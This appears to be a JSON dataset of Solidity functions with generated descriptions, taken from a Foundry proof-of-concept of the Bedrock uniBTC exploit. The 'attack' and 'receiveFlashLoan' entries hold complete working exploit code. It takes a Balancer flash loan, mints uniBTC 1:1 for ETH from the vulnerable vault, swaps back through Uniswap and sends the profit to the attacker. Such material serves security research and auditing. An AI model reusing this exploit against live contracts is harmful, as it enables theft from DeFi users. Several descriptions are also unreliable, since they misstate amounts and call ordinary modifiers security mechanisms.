[
  {
    "contract/interface": "Bedrock_DeFi_exp",
    "source_type": "attacker_contract",
    "function_name": "IS_TEST",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "Bedrock_DeFi_exp",
    "source_type": "attacker_contract",
    "function_name": "excludeArtifacts",
    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
    "description": "1. Core functions:  \nThis function is designed to provide a list of excluded artifacts. It simply retrieves and returns a predefined list of items that are excluded from certain operations or processes within the smart contract.\n\n2. Security mechanism:  \nThe function uses the `public` and `view` modifiers. The `public` modifier allows the function to be called from outside the contract, while the `view` modifier ensures that the function does not modify the state of the contract, making it safe to call without incurring gas costs or altering any data.\n\n3. Parameter Function:  \nThis function does not take any parameters. It operates solely based on the internal state of the contract, specifically the `_excludedArtifacts` variable.\n\n4. Return description:  \nThe function returns the value of `_excludedArtifacts`, which is a list of strings. This list represents the artifacts that have been excluded from certain operations within the contract. The return value is directly taken from the internal state without any additional calculations or transformations.\n\nIn summary, this function is a simple read-only operation that provides a list of excluded artifacts stored in the contract, ensuring no state changes occur during its execution."
  },
  {
    "contract/interface": "Bedrock_DeFi_exp",
    "source_type": "attacker_contract",
    "function_name": "excludeContracts",
    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
    "description": "1. **Core functions:**  \n   This function is designed to provide a list of contract addresses that have been excluded from certain operations or rules within the smart contract. It simply retrieves and returns the stored list of excluded contracts.\n\n2. **Security mechanism:**  \n   The function is marked as `public` and `view`, meaning it can be called by anyone but does not modify the state of the contract. This ensures that the function is read-only and safe to use without risking unintended changes to the contract's data.\n\n3. **Parameter Function:**  \n   The function does not take any parameters. It only retrieves and returns the predefined list of excluded contract addresses stored in the `_excludedContracts` variable.\n\n4. **Return description:**  \n   The function returns an array of addresses (`address[] memory excludedContracts_`). This array contains the list of contract addresses that have been excluded from specific operations or rules in the smart contract. The return value is directly taken from the `_excludedContracts` variable.\n\nIn summary, this function is a simple read-only utility that provides a list of excluded contract addresses, ensuring transparency and accessibility of this information without altering the contract's state."
  },
  {
    "contract/interface": "Bedrock_DeFi_exp",
    "source_type": "attacker_contract",
    "function_name": "excludeSenders",
    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
    "description": "1. **Core functions:**  \n   This function is designed to provide a list of addresses that are excluded from certain operations or rules within the smart contract. It essentially retrieves and returns the addresses stored in a predefined list (`_excludedSenders`), allowing users or other functions to know which addresses are excluded.\n\n2. **Security mechanism:**  \n   The function uses the `view` modifier, which ensures that it only reads data from the blockchain and does not modify any state. This makes the function safe to call without worrying about unintended changes to the contract. Additionally, since it is `public`, it can be accessed by anyone, but its read-only nature prevents any security risks.\n\n3. **Parameter Function:**  \n   This function does not take any parameters. It simply retrieves and returns the list of excluded addresses stored in the contract.\n\n4. **Return description:**  \n   The function returns an array of addresses (`address[] memory excludedSenders_`). The returned value is a direct copy of the `_excludedSenders` list, which contains the addresses that are excluded from specific operations or rules in the contract.\n\nIn summary, this function is a simple read-only utility that provides a list of excluded addresses stored in the contract, ensuring transparency and accessibility without any risk of state modification."
  },
  {
    "contract/interface": "Bedrock_DeFi_exp",
    "source_type": "attacker_contract",
    "function_name": "failed",
    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
    "description": "1. **Core functions**:  \n   The `failed()` function is designed to check whether a specific failure condition has occurred. It looks at a stored value (`_failed`) to determine if the failure condition is true. If `_failed` is not set, it retrieves and checks another value from a virtual machine (VM) storage to determine the failure status.\n\n2. **Security mechanism**:  \n   The function uses the `view` modifier, which ensures that it does not modify the state of the contract, making it safe to call without incurring gas costs. Additionally, it relies on internal storage (`_failed`) and external VM storage for its logic, which helps isolate and secure the failure-checking process.\n\n3. **Parameter Function**:  \n   The function does not take any parameters. It operates solely based on internal and external storage values to determine the failure status.\n\n4. **Return description**:  \n   The function returns a boolean value (`true` or `false`). If `_failed` is `true`, it directly returns `true`. If `_failed` is not set, it checks a value stored in the VM's storage. If this value is not zero, it returns `true`; otherwise, it returns `false`. Essentially, it indicates whether a failure condition has been met based on the stored data.\n\nIn summary, the `failed()` function checks for a failure condition by examining internal and external storage values. It uses a `view` modifier for safety and returns a boolean result to indicate the failure status."
  },
  {
    "contract/interface": "Bedrock_DeFi_exp",
    "source_type": "attacker_contract",
    "function_name": "setUp",
    "original_code": "    function setUp() public {\n        vm.createSelectFork(\"mainnet\", 20_836_584 - 1);\n    }\n\n",
    "description": "1. Core functions:  \nThe `setUp` function is designed to prepare the environment for testing or simulation. It uses a tool to create a simulated version of the Ethereum mainnet at a specific block height. This allows developers to test their code in a controlled environment that mimics the real Ethereum network.\n\n2. Security mechanism:  \nThe function is marked as `public`, meaning it can be called by anyone. However, since this is likely a testing function, it doesnâ€™t include additional security measures like access control or input validation. Its purpose is to set up a testing environment rather than handle sensitive operations.\n\n3. Parameter Function:  \nThe function does not take any parameters. It relies on hardcoded values, such as the network name (`\"mainnet\"`) and the block height (`20_836_584 - 1`), to create the simulated environment.\n\n4. Return description:  \nThe function does not return any value. Its purpose is to execute the setup process, not to produce an output.\n\nIn summary, the `setUp` function is a utility for creating a simulated Ethereum mainnet environment at a specific block height, primarily used for testing purposes. It has no parameters or return values and is publicly accessible."
  },
  {
    "contract/interface": "Bedrock_DeFi_exp",
    "source_type": "attacker_contract",
    "function_name": "targetArtifactSelectors",
    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
    "description": "1. Core functions:  \nThis function is designed to provide a list of specific selectors (identifiers) for artifacts that are targeted for fuzz testing. Fuzz testing is a method used to find vulnerabilities by inputting random or unexpected data. The function retrieves and returns these selectors, which are stored in a private variable, to the caller.\n\n2. Security mechanism:  \nThe function uses the `view` modifier, which ensures that it does not modify the state of the contract. This makes it safe to call without worrying about unintended changes to the contract's data. Additionally, the function is `public`, meaning it can be accessed by anyone, but since it only reads data, there is no risk of unauthorized modifications.\n\n3. Parameter Function:  \nThis function does not take any parameters. It simply retrieves and returns the stored list of targeted artifact selectors.\n\n4. Return description:  \nThe function returns an array of `FuzzSelector` objects, which represent the selectors for the artifacts targeted in fuzz testing. The return value is directly taken from the private variable `_targetedArtifactSelectors`, ensuring that the data is consistent with what is stored in the contract.\n\nIn summary,  \nThis function is a straightforward utility that retrieves and returns a list of selectors used for fuzz testing. It is safe to use as it does not modify the contract's state and provides read-only access to the stored data."
  },
  {
    "contract/interface": "Bedrock_DeFi_exp",
    "source_type": "attacker_contract",
    "function_name": "targetArtifacts",
    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
    "description": "1. **Core functions**:  \nThis function is designed to provide a list of specific items or targets, referred to as \"artifacts,\" that are stored in the smart contract. It allows anyone to view these items without making any changes to the contract. Essentially, it acts as a read-only function to retrieve information.\n\n2. **Security mechanism**:  \nThe function uses the `public` and `view` modifiers. The `public` modifier ensures that the function can be called by anyone, while the `view` modifier guarantees that the function will not modify the state of the contract, making it safe for reading data without any risk of unintended changes.\n\n3. **Parameter Function**:  \nThis function does not take any parameters. It simply retrieves and returns the list of targeted artifacts stored in the contract.\n\n4. **Return description**:  \nThe function returns an array of strings (`string[] memory`), which represents the list of targeted artifacts. The value returned is directly taken from the internal variable `_targetedArtifacts`, ensuring that the output is an exact copy of the stored data.\n\nIn summary, this function is a straightforward way to access and view a list of targeted artifacts stored in the smart contract, with built-in safeguards to ensure it only reads data without making any modifications."
  },
  {
    "contract/interface": "Bedrock_DeFi_exp",
    "source_type": "attacker_contract",
    "function_name": "targetContracts",
    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
    "description": "1. Core functions:  \nThis function is designed to provide a list of addresses that are considered \"targeted contracts.\" It allows anyone to view these addresses without making any changes to the contract's state. Essentially, it acts as a read-only function to retrieve information about the contracts that are being focused on or monitored.\n\n2. Security mechanism:  \nThe function uses the `view` modifier, which ensures that it does not modify the contract's state. This means it only reads data and does not perform any actions that could alter the contract's storage or behavior. Additionally, since it is marked as `public`, it can be called by anyone, but the `view` modifier prevents any unauthorized changes.\n\n3. Parameter Function:  \nThis function does not take any parameters. It simply retrieves and returns the list of targeted contract addresses stored in the `_targetedContracts` variable.\n\n4. Return description:  \nThe function returns an array of addresses (`address[] memory targetedContracts_`). The value returned is directly taken from the `_targetedContracts` variable, which stores the list of addresses. There is no complex calculation or transformation; it just provides the stored data as-is.\n\nIn summary,  \nThis function is a straightforward way to access and view the list of targeted contract addresses stored in the contract. It is secure because it only reads data and does not allow any modifications, and it does not require any input parameters to operate."
  },
  {
    "contract/interface": "Bedrock_DeFi_exp",
    "source_type": "attacker_contract",
    "function_name": "targetInterfaces",
    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
    "description": "1. **Core functions**:  \n   This function is designed to retrieve and return a list of targeted interfaces stored in the contract. It acts as a simple accessor, allowing external users or other contracts to view the interfaces that are being focused on or used within the system.\n\n2. **Security mechanism**:  \n   The function uses the `view` modifier, which ensures that it does not modify the state of the contract. This makes it safe to call without worrying about unintended changes. Additionally, since it only reads data, it does not require any special permissions or access control.\n\n3. **Parameter Function**:  \n   The function does not take any parameters. It simply accesses and returns the internal data stored in the `_targetedInterfaces` array.\n\n4. **Return description**:  \n   The function returns the entire `_targetedInterfaces` array, which contains a list of `FuzzInterface` objects. The output is a direct copy of the internal array, providing a snapshot of the targeted interfaces at the time the function is called.\n\n**In summary**, this function is a straightforward way to access and view the list of targeted interfaces stored in the contract, ensuring no state changes occur during its execution."
  },
  {
    "contract/interface": "Bedrock_DeFi_exp",
    "source_type": "attacker_contract",
    "function_name": "targetSelectors",
    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
    "description": "1. **Core functions**:  \n   This function is designed to provide a list of specific selectors (identifiers for functions) that are targeted for testing or fuzzing. It allows users or other parts of the system to retrieve these selectors for further use or analysis.\n\n2. **Security mechanism**:  \n   The function is marked as `public` and `view`, ensuring it can be called by anyone but does not modify the state of the contract. This prevents any unintended changes to the contract's data. Additionally, it returns a memory array, which is a safe way to handle data without exposing storage directly.\n\n3. **Parameter Function**:  \n   This function does not take any parameters. It simply retrieves and returns the stored list of targeted selectors.\n\n4. **Return description**:  \n   The function returns an array of `FuzzSelector` types, which represents the list of selectors that have been targeted. The output is directly taken from the internal storage variable `_targetedSelectors` and returned as-is.\n\nIn summary, this function is a straightforward utility to fetch a predefined list of function selectors, ensuring it is safe to use and does not alter the contract's state."
  },
  {
    "contract/interface": "Bedrock_DeFi_exp",
    "source_type": "attacker_contract",
    "function_name": "targetSenders",
    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
    "description": "1. **Core functions**:  \n   This function is designed to provide a list of addresses that have been marked as \"targeted senders.\" It simply retrieves and returns the stored list of these addresses. Its primary role is to allow external users or other parts of the smart contract to access this information.\n\n2. **Security mechanism**:  \n   The function uses the `public` and `view` modifiers. The `public` modifier ensures that the function can be called by anyone, while the `view` modifier guarantees that the function does not modify the state of the contract, making it safe to call without incurring gas costs or altering data.\n\n3. **Parameter Function**:  \n   This function does not take any parameters. It directly accesses and returns the internal list of targeted senders stored in the `_targetedSenders` variable.\n\n4. **Return description**:  \n   The function returns an array of addresses (`address[] memory targetedSenders_`). The output is a copy of the internal `_targetedSenders` list, which contains the addresses that have been designated as targeted senders. No additional calculations or transformations are performed on the data before it is returned.\n\n**In summary**, this function serves as a simple read-only mechanism to retrieve a list of targeted sender addresses stored in the contract. It is secure, does not modify any data, and requires no input parameters."
  },
  {
    "contract/interface": "Bedrock_DeFi_exp",
    "source_type": "attacker_contract",
    "function_name": "testPoCMinimal",
    "original_code": "    function testPoCMinimal() public {\n        // Borrow 200 ether to the attacker\n        vm.deal(attacker, 200e18);\n\n        // The attacker mint 200 ETH to 200 uniBTC\n        vm.startPrank(attacker);\n        IFS(VulVault).mint{value: 200e18}();\n\n",
    "description": "1. Core functions:  \nThe `testPoCMinimal` function is designed to simulate a specific scenario where an attacker borrows 200 ether and uses it to mint 200 uniBTC tokens. This function is likely part of a test or proof-of-concept to demonstrate how an attacker might exploit a vulnerability in a smart contract system.\n\n2. Security mechanism:  \nThe function uses `vm.deal` and `vm.startPrank` to simulate the attacker's actions in a controlled environment. These are likely part of a testing framework (e.g., Foundry) that allows developers to manipulate blockchain state and impersonate accounts for testing purposes. There are no explicit security mechanisms in this function itself, as it is focused on simulating an attack scenario rather than defending against one.\n\n3. Parameter Function:  \nThe function does not take any parameters. It directly interacts with predefined variables or contracts, such as `attacker` and `VulVault`, which are assumed to be set up in the broader context of the code.\n\n4. Return description:  \nThe function does not return any value. Its purpose is to execute a sequence of actions (borrowing ether and minting tokens) rather than compute or provide an output.\n\nIn summary,  \nThe `testPoCMinimal` function simulates an attack scenario where an attacker borrows 200 ether and mints 200 uniBTC tokens. It uses testing tools to manipulate the blockchain state and impersonate the attacker, but it does not include security mechanisms or return any value."
  },
  {
    "contract/interface": "Bedrock_DeFi_exp",
    "source_type": "attacker_contract",
    "function_name": "testPoCReplicate",
    "original_code": "    function testPoCReplicate() public {\n        vm.startPrank(attacker);\n        attackerC = new Attacker();\n\n        attackerC.attack();\n\n        console.log(\"Final balance in WETH :\", IFS(weth).balanceOf(attacker));\n    }\n",
    "description": "1. Core functions:  \nThe `testPoCReplicate` function is designed to simulate an attack scenario in a controlled environment. It sets up an attacker account, deploys a malicious contract (`Attacker`), and then triggers the attack by calling the `attack` function within the malicious contract. Finally, it logs the final balance of the attacker in a specific token (WETH) to observe the outcome of the attack.\n\n2. Security mechanism:  \nThe function uses `vm.startPrank(attacker)` to simulate the attacker's actions in a testing environment. This ensures that the attack is isolated and does not affect the actual system. The use of a testing framework (like Foundry) allows for safe experimentation without real-world consequences. However, the function itself does not include additional security measures since it is intended to replicate an attack scenario.\n\n3. Parameter Function:  \nThe function does not take any parameters. It relies on predefined variables like `attacker` and `weth`, which are assumed to be set up elsewhere in the code. The `attacker` variable represents the attacker's address, and `weth` represents the token contract being targeted.\n\n4. Return description:  \nThe function does not return any value. Instead, it logs the final balance of the attacker in the WETH token using `console.log`. This balance is calculated by querying the WETH contract for the attacker's balance after the attack has been executed.\n\nIn summary,  \nThe `testPoCReplicate` function is a testing tool that simulates an attack by deploying a malicious contract and executing its attack function. It uses a testing framework to isolate the attack and logs the attacker's final balance in a specific token to analyze the outcome. The function does not take parameters or return values but relies on predefined variables to carry out its purpose."
  },
  {
    "contract/interface": "Attacker",
    "source_type": "attacker_contract",
    "function_name": "attack",
    "original_code": "    function attack() external {\n        txSender = msg.sender;\n\n        IFS(uniBTC).approve(uniV3Router, type(uint256).max);\n        IFS(WBTC).approve(uniV3Router, type(uint256).max);\n\n        address[] memory tokens = new address[](1);\n        tokens[0] = weth;\n        uint256[] memory amounts = new uint256[](1);\n        amounts[0] = 30_800_000_000_000_000_000;\n        IFS(balancerVault).flashLoan(address(this), tokens, amounts, \"\");\n    }\n\n",
    "description": "1. **Core functions:**  \n   The `attack` function is designed to initiate a specific operation involving two main steps. First, it sets the `txSender` variable to the address of the caller (the one who triggered the function). Then, it approves two tokens (`uniBTC` and `WBTC`) for unlimited spending by the `uniV3Router`. After that, it requests a flash loan from the `balancerVault` for a large amount of `weth` (a specific token). The purpose of this function appears to be executing a financial operation, possibly exploiting or interacting with decentralized finance (DeFi) protocols.\n\n2. **Security mechanism:**  \n   The function uses the `external` modifier, which means it can only be called from outside the contract, not internally. However, there are no explicit security checks or access controls in this function. The use of `type(uint256).max` for approval allows unlimited spending, which could be risky if not properly managed. The function also relies on external contracts (`uniV3Router` and `balancerVault`), so its security depends on the trustworthiness and robustness of those contracts.\n\n3. **Parameter Function:**  \n   The function does not take any direct parameters. However, it interacts with several predefined variables and contracts:  \n   - `msg.sender`: Represents the address of the caller, stored in `txSender`.  \n   - `uniBTC` and `WBTC`: Tokens approved for unlimited spending by `uniV3Router`.  \n   - `weth`: The token for which the flash loan is requested.  \n   - `amounts[0]`: Specifies the amount of `weth` to be borrowed (30.8 quintillion units).  \n\n4. **Return description:**  \n   The function does not return any value. Its primary purpose is to execute the described operations (approvals and flash loan request) rather than compute or return a result.  \n\n**In summary,**  \nThe `attack` function is a tool for initiating a financial operation involving approvals and a flash loan. It lacks built-in security measures and relies on external contracts, making its safety dependent on those external systems. The function does not return any value but performs actions that could have significant financial implications."
  },
  {
    "contract/interface": "Attacker",
    "source_type": "attacker_contract",
    "function_name": "receiveFlashLoan",
    "original_code": "    function receiveFlashLoan(\n        address[] memory tokens,\n        uint256[] memory amounts,\n        uint256[] memory feeAmounts,\n        bytes memory userData\n    ) external {\n        IFS(weth).withdraw(amounts[0]);\n        IFS(VulVault).mint{value: address(this).balance}();\n        uint256 bal_uniBTC = IFS(uniBTC).balanceOf(address(this));\n\n        IFS.ExactInputSingleParams memory input = IFS.ExactInputSingleParams(\n            uniBTC, // address tokenIn;\n            WBTC, // address tokenOut;\n            500, // uint24 fee;\n            address(this), // address recipient;\n            block.timestamp, // uint256 deadline;\n            bal_uniBTC, // uint256 amountIn;\n            0, // uint256 amountOutMinimum;\n            0 // uint160 sqrtPriceLimitX96;\n        );\n\n        IFS(uniV3Router).exactInputSingle(input);\n\n        uint256 balWBTC = IFS(WBTC).balanceOf(address(this));\n\n        input = IFS.ExactInputSingleParams(\n            WBTC, // address tokenIn;\n            weth, // address tokenOut;\n            500, // uint24 fee;\n            address(this), // address recipient;\n            block.timestamp, // uint256 deadline;\n            balWBTC, // uint256 amountIn;\n            0, // uint256 amountOutMinimum;\n            0 // uint160 sqrtPriceLimitX96;\n        );\n\n        IFS(uniV3Router).exactInputSingle(input);\n        IFS(weth).transfer(balancerVault, amounts[0]);\n\n        uint256 bal_weth = IFS(weth).balanceOf(address(this));\n        IFS(weth).transfer(txSender, bal_weth);\n    }\n\n",
    "description": "1. **Core functions**:  \n   This function is designed to handle a flash loan, which is a type of loan where borrowed funds must be returned within the same transaction. The function performs several steps:  \n   - It withdraws a specific amount of WETH (Wrapped Ether) from a contract.  \n   - It mints tokens in a vault using the withdrawn Ether.  \n   - It checks the balance of a specific token (uniBTC) and swaps it for another token (WBTC) using a decentralized exchange router.  \n   - It then swaps the WBTC back to WETH.  \n   - Finally, it repays the flash loan by transferring the borrowed WETH back to the lender and sends any remaining WETH to the transaction sender.  \n\n2. **Security mechanism**:  \n   - The function is marked as `external`, meaning it can only be called from outside the contract, ensuring internal state changes are controlled.  \n   - It uses balance checks (`balanceOf`) to ensure the correct amounts of tokens are being handled.  \n   - The function relies on external contracts (e.g., `IFS(weth)`, `IFS(uniV3Router)`) for operations, which implies trust in these contracts' security.  \n   - The `block.timestamp` is used as a deadline for transactions, ensuring they are executed within a valid time frame.  \n\n3. **Parameter Function**:  \n   - `tokens`: An array of token addresses involved in the flash loan.  \n   - `amounts`: An array of amounts corresponding to the tokens borrowed in the flash loan.  \n   - `feeAmounts`: An array of fees associated with the flash loan.  \n   - `userData`: Additional data that can be passed for custom logic.  \n   These parameters provide the necessary details for the function to execute the flash loan and associated swaps.  \n\n4. **Return description**:  \n   This function does not return any value. Instead, it performs a series of operations to handle the flash loan, swap tokens, and transfer balances. The final step transfers any remaining WETH to the transaction sender, effectively concluding the process.  \n\n**In summary**, this function manages a flash loan by withdrawing, swapping, and repaying tokens in a single transaction. It relies on external contracts for operations and ensures balances are correctly handled. The function does not return a value but completes its task by transferring tokens as needed."
  },
  {
    "contract/interface": "IFS",
    "source_type": "victim_contract",
    "function_name": "allowance",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IFS",
    "source_type": "victim_contract",
    "function_name": "approve",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IFS",
    "source_type": "victim_contract",
    "function_name": "balanceOf",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IFS",
    "source_type": "victim_contract",
    "function_name": "decimals",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IFS",
    "source_type": "victim_contract",
    "function_name": "deposit",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IFS",
    "source_type": "victim_contract",
    "function_name": "exactInputSingle",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IFS",
    "source_type": "victim_contract",
    "function_name": "flashLoan",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IFS",
    "source_type": "victim_contract",
    "function_name": "mint",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IFS",
    "source_type": "victim_contract",
    "function_name": "name",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IFS",
    "source_type": "victim_contract",
    "function_name": "owner",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IFS",
    "source_type": "victim_contract",
    "function_name": "symbol",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IFS",
    "source_type": "victim_contract",
    "function_name": "totalSupply",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IFS",
    "source_type": "victim_contract",
    "function_name": "transfer",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IFS",
    "source_type": "victim_contract",
    "function_name": "transferFrom",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IFS",
    "source_type": "victim_contract",
    "function_name": "withdraw",
    "original_code": "",
    "description": ""
  }
]